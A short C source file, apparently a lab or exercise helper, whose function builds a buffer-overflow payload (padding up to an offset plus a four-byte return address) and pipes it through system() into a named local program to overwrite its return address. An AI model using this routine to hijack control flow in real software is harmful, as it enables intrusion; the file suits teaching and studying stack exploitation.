#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void override_return(char* prgrm, int address, int offset){
	/*printf("override return received: %s, %s, %d\n", prgrm, address, offset);*/
	printf("RUNNING PROGRAM WITH PAYLOAD\n=========================================\n\n");
	int len = strlen(prgrm);
	char cmd[10000] = "echo ";
	for (int i = 0; i < offset; i++) {
		strcat(cmd, "\x65");
	}
	
	char*c = (char*) &address;
	strncat(cmd, (c), 1);
	strncat(cmd, (c+1), 1);
	strncat(cmd, (c+2), 1);
	strncat(cmd, (c+3), 1);

	strcat(cmd, " | ./");
	strcat(cmd, prgrm);
	/*printf("%c %c %c %c", *(c+3), *(c+2), *(c+1), *(c));
	printf("%s\n", cmd);*/
	system(cmd);
}
